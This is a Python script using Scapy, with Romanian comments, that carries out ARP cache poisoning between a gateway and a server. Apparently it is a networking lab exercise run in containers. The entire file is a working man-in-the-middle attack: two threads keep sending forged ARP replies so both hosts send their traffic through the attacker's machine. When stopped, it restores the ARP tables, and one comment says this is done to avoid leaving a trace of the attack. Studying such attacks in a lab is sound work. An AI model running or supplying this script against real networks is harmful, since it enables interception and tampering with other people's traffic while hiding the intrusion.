# Pentru restaurarea tabelei ARP si structurarea logica
# a atacului m-am folosit de articolul:
#
# https://ismailakkila.medium.com/black-hat-python-arp-cache-poisoning-with-scapy-7cb1d8b9d242 

from scapy.all import *
import time
import threading

midlle_IP = "198.7.0.3"
middle_MAC = ""
default_gateway_IP = "198.7.0.1"
default_gateway_MAC = ""
server_IP = "198.7.0.2"
server_MAC = ""
poisoning_is_running = True

def get_MAC_address(destination_IP):
    # trimite request-ul initial pentru ca table ARP middle
    # sa invete asocierea adreselor MAC si IP pentru ruter si server

    # un request brodcast din middle 
    answer, _ = sr(ARP(op=1, pdst=destination_IP, hwdst="ff:ff:ff:ff:ff:ff"), timeout=5, verbose=0)
    
    # returneaza raspunsul destinatie, MAC adresul destinatiei
    for _, response in answer:
        print("[*] Got IP mac address {} for IP address {}".format(response[ARP].hwsrc, destination_IP))
        return response[ARP].hwsrc

    return None

def ARP_restoring(destination_IP, destination_MAC, source_IP, source_MAC):
    # cand incheiem atacul, restauram tabelele ARP pentru a fi valide
    # si pentru nu a lasa o urma a atacului
    print("[*] Restoring {}'s ARP table.".format(destination_IP))
    send(ARP(op=2, pdst=destination_IP, hwdst=destination_MAC, psrc=source_IP, hwsrc=source_MAC), verbose=0)

def ARP_poisoning(destination_IP, destination_MAC, source_IP, source_MAC):
    global poisoning_is_running
    global middle_MAC
    print("[*] Started poisoning the ARP table for {}.".format(destination_IP))

    try:
        # trimite constant request-uri prin care o adresa IP va fi asociata
        # in mod eronat adresei MAC a middle-ului
        while poisoning_is_running:
                           # IP VICTIMA         # MAC VICTIMA          # IP PE CARE ATACATORUL VREA SA-L IMPERSONEZE  
            send(ARP(op=2, pdst=destination_IP, hwdst=destination_MAC, psrc=source_IP, hwsrc=middle_MAC), verbose=0)
            time.sleep(5)                                                             #ADRESA MAC A CELUI CARE TRIMITE SA PARA A FI CEA A LUI MIDDLE, NU MIDDLE2(PENTRU CA CONTAINERUL middle2 RULEAZA PRCESUL ASTA)

        # va iesi din while in moment-ul in care se va opri otravirea
        exit(0)
    finally:
        # se restaureaza tabela ARP
        print("[!] Stopped poisoning {}'s ARP table.".format(destination_IP))
        ARP_restoring(destination_IP, destination_MAC, source_IP, source_MAC)

# initiam tabela ARP pentru middle, respectiv ruter si server
default_gateway_MAC = get_MAC_address(default_gateway_IP)
server_MAC = get_MAC_address(server_IP)
middle_MAC = get_MAC_address(midlle_IP) # AM NEVOIE DE MAC PENTRU MIDDLE

# doua thread-uri care se vor ocupa in paralel de
# otravirea tabelelor ARP
default_getaway_thread = threading.Thread(target=ARP_poisoning, args=(default_gateway_IP, default_gateway_MAC, server_IP, server_MAC))
default_getaway_thread.start()

server_thread = threading.Thread(target=ARP_poisoning, args=(server_IP, server_MAC, default_gateway_IP, default_gateway_MAC))
server_thread.start()

try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    print("[!] Poisoning is stopping...")
    # oprtim thread-urile si 
    # asteptam sa restaureze tabelele ARP
    poisoning_is_running = False

    default_getaway_thread.join()    
    server_thread.join()
